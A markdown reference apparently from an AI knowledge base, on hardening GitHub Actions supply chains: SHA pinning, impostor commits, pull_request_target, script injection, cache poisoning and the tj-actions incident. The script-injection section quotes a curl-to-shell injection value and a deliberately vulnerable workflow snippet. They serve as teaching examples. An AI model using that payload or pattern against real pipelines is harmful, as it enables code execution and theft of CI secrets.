# Supply chain

Fetched 2026-10-29 from https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions, https://github.com/actions/attest-build-provenance, https://github.com/actions/attest, https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target, https://securitylab.github.com/resources/github-actions-preventing-pwn-requests, https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout, https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction, https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066, https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning, https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-code-injection.

Contents: SHA pinning · resolving a tag to a SHA · impostor commits ·
attestations · "immutable actions" (not found) · `pull_request_target` and
checkout v7 · script injection · Dependabot for actions · cache poisoning ·
the tj-actions incident · sources.

## SHA pinning is the immutable form

GitHub's hardening guide says to pin references to actions to a commit
SHA, which "helps mitigate the risk of a bad actor adding a backdoor to
the action's repository", and that even a trusted author's tag "can be
moved or deleted" —
https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.
A tag or branch ref can be repointed by whoever controls the action's
repository (see the tj-actions incident below); a SHA cannot. The guide
now ranks a lockfile above this: it records the exact commit of every
action a workflow depends on, transitive ones included, and "supersedes
SHA pinning for repositories that adopt it". The lockfile mechanics were
not captured in this pass; read the guide before relying on it. The older
"only way to use an action as an immutable release" wording is gone from
the page, so do not quote it.

```yaml
- uses: actions/checkout@0000000000000000000000000000000000000000 # v4
```

Keep the version as a same-line trailing comment. The comment is cosmetic
to the runner but is what keeps the pin readable to a human — and, per
that same guide, to Dependabot (see below), which updates the version
documentation only when the comment is on the same line.

## Resolving a tag to a SHA

Not from an official GitHub docs page — this is standard REST API
mechanics summarized from a dev.to walkthrough, not GitHub's own
documentation:

```bash
gh api repos/OWNER/REPO/commits/TAG --jq .sha
# or, to dereference an annotated tag explicitly:
gh api repos/OWNER/REPO/git/ref/tags/TAG --jq .object.sha
```

The first form resolves a tag (lightweight or annotated) to the commit
SHA it currently points at. The second walks the annotated-tag object
itself. Either is fine for pinning; re-run it when bumping a version,
since the whole point is that the tag can move.

## Impostor commits

A SHA that exists only in a fork of the action, not in the upstream
repository the `uses:` line names. `git` and GitHub's UI both resolve a
short or full SHA against any fork that has ever been pushed to GitHub,
including forks with no relationship to the maintainers, so a SHA that
"looks pinned" can still point at attacker-controlled code if it wasn't
actually resolved against the upstream repo. The hardening guide's advice
is "verify it is from the action's repository and not a repository fork"
(it does not use the term "impostor commit"). zizmor's `impostor-commit`
audit flags exactly this case (see `runtime-shape.md` for the tool).

## Attestations

Artifact attestations (build provenance, backed by Sigstore) — the cited
pages no longer state a GA date (the 2024-05-06 cache-poisoning post notes
the public beta announced 2024-05-02), so none is claimed here.
`actions/attest-build-provenance` as of its v4 is a wrapper around the
more general `actions/attest`; its README says existing users may keep it
but new implementations should use `actions/attest` directly —
https://github.com/actions/attest-build-provenance, https://github.com/actions/attest.
`actions/attest` documents `id-token: write` (the Sigstore certificate),
`attestations: write` (persisting the attestation) and `artifact-metadata:
write` (the storage record); the docs' examples add `contents: read`, plus
`packages: write` for container images.

## "Immutable actions": not a distinct feature

No evidence was found of an "immutable actions" GA feature distinct from
the two mechanisms above — NOT FOUND. What GitHub actually ships under
the word "immutable" is SHA pinning (this file) and the immutable OIDC
subject claims described in `permissions-and-oidc.md`. Don't cite an
"immutable actions" toggle or setting; it isn't there.

## `pull_request_target` and checkout v7's default refusal

`pull_request_target` runs with the base repository's `GITHUB_TOKEN` and
its secrets, even when the triggering pull request comes from a fork —
https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target.
Checking out the fork's PR head and then running anything from it (a
build script, a test command) hands attacker-controlled code the base
repo's privileged token — GitHub's security lab names this a "pwn
request" — https://securitylab.github.com/resources/github-actions-preventing-pwn-requests.

`actions/checkout` v7 (released 2026-06-18) refuses by default to check
out a fork PR head under `pull_request_target`, or under `workflow_run`
only when `workflow_run.event` is a `pull_request*` event: it fails when
`repository:` resolves to the fork, or `ref:` is `refs/pull/N/head`,
`refs/pull/N/merge` or the fork's head or merge SHA —
https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout.
The same default was backported to the older supported majors, enforced
from 2026-07-20 (v1 excluded): a floating `@v4` picks it up, but a pin to a
SHA, minor or patch does not, so a SHA-pinned old checkout stays unguarded
until it is bumped. Not covered: other untrusted repositories, `git` or
`gh pr checkout` inside `run:`, and other events such as `issue_comment`.
The opt-out is explicit:

```yaml
- uses: actions/checkout@0000000000000000000000000000000000000000 # v7
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    allow-unsafe-pr-checkout: true   # only with a real reason, reviewed
```

Treat `allow-unsafe-pr-checkout: true` itself as a finding worth a second
look in review — it exists specifically to bypass this guard. GitHub's
page calls the head checkout harmless in itself: the danger is any later
step that executes it, so the code must only ever be inspected as data.
The security lab's other mitigations: split an unprivileged `pull_request`
build (artifacts out) from a privileged `workflow_run` consumer that treats
those artifacts as untrusted, set `persist-credentials: false` on checkout,
and treat a "safe to test" label gate as temporary (new commits can land
after the label). See
`review-pull-request-target` in `evals/` for the case this reference
backs.

## Script injection via `run:`

Untrusted values from the triggering event — a PR title, an issue body, a
commit message — are attacker-controlled text. Interpolating them
directly into a `run:` block with `${{ }}` makes them shell code, not
data — https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.

```yaml
# vulnerable: the PR title is spliced into the shell command
- run: echo "Building ${{ github.event.pull_request.title }}"

# fixed: the value crosses into an environment variable first
- run: echo "Building $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The `env:` form still lets the value reach the script, but as a
variable's contents rather than as interpolated source — a title like
`"; curl evil.sh | sh #` no longer executes. The guide lists this as the
preferred form for inline scripts; for heavier handling it recommends a
JavaScript action that takes the context value as an argument.

## Dependabot for actions

The hardening guide's point about keeping the version comment on a SHA
pin is so Dependabot can keep the version documentation current in the
version-bump PRs it opens — same URL as SHA pinning above. If the pinned
commit matches no tag, Dependabot moves the pin to the latest commit. The
trap: Dependabot security alerts cover only actions that use semantic
versioning and "will not create alerts for actions pinned to SHA values",
so a pinned workflow gets version PRs but no vulnerability alert. No
`dependabot.yml` ecosystem syntax was captured in this pass; check the
guide directly before writing that file from memory.

## Cache poisoning through `restore-keys`

Code running in a workflow that can write the default branch's cache can
seed an entry under a `restore-keys` prefix (a prefix miss restores the most
recent matching entry) that a later, more privileged workflow restores —
that workflow ends up trusting contents an attacker wrote. Cache keys are
client-chosen; only branch scoping is enforced server-side. The attacker can
also fill the 10 GB cache to evict legitimate entries. This is a blog-sourced
finding, not from GitHub's own docs — https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning,
corroborated by CodeQL's query help for the class:
https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-code-injection.
The post's case studies are Angular (2024, via a `pull_request_target`
workflow) and others; neither source mentions a 2026 incident, so none is
claimed. Two limits: per the post's 2025-01-23 update, a job can no longer
write the cache after it finishes, so poisoning happens during the build;
and per CodeQL, low-trust triggers (`issue_comment`, `pull_request_target`,
`workflow_run`) now get read-only cache access, so the query flags code
injection in workflows that can write the default-branch cache, such as a
push-to-main job interpolating a commit message. Feature branches read
their parent's cache, siblings do not share. Remedies: no caching in release
workflows, validate or sign restored contents, never run untrusted code in
the default branch's context. See `runtime-shape.md` for `restore-keys`
prefix-match mechanics.

## The tj-actions/changed-files incident

In March 2025, existing version tags of `tj-actions/changed-files` were
rewritten to point at malicious code (CVE-2025-30066) that dumped runner
memory, exposing workflow secrets (cloud keys, PATs, npm tokens, RSA keys)
as a double-encoded base64 blob in the logs of public repositories —
https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction,
https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066.
CISA's audit window is 2025-03-12 to 2025-03-15 and the patched release is
v46.0.1; CISA also ties it to a compromise of `reviewdog/action-setup`
(CVE-2025-30154) that may have enabled it. Neither cited page gives the tag
range or a total repository count (Wiz names "dozens" of public ones), so
none is claimed here. This is the case for SHA pinning stated above, not
as a hypothetical: a tag pin on this action silently started running
attacker code on the next workflow run with no change to the caller's file,
while Wiz notes SHA pins were safe unless bumped to an affected hash in the
window.

## Sources

URLs are listed in the Fetched line above and inline per section. The
tag-to-SHA `gh api` recipe is a dev.to walkthrough, not an official
GitHub docs page; the cache-poisoning section is blog- and
CodeQL-sourced, not GitHub's own docs. Fetched 2026-10-29.
